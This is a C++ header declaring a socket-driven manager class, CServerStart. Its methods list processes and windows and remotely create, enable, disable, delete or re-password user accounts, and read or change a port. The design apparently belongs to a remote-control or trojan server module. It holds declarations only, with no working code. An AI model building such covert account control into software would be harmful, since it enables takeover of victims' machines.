// SerManager.h: interface for the CServerStart class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_ServerStart_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_)
#define AFX_ServerStart_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CServerStart : public CManager  
{
public:
	CServerStart(CClientSocket *pClient);
	virtual ~CServerStart();
	void SendProcessListo();

	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static bool CALLBACK EnumWindowsProco( HWND hwnd, LPARAM lParam);

private:
	LPBYTE getProcessListo();
	LPBYTE getWindowsListo();
//	void SendProcessListo();
	void SendWindowsListo();
	void SendNetsDele(LPBYTE lpBuffer, UINT nSize);
	void SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt);  //帐户启用 停止
	void SendNetsPassword(LPBYTE lpBuffer, UINT nSize);   //帐户密码修改
	void getuseAdd(LPBYTE lpBuffer, UINT nSize);   //帐户建立
	void SendNetsPassPort(LPBYTE lpBuffer, UINT nSize);  //端口修改
	void SendNetPortRead(char Prot[]);   //端口读取
	void SendNetPortReturn(UINT Port);  //端口数据返回


};

#endif // !defined(AFX_SerManager_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_)
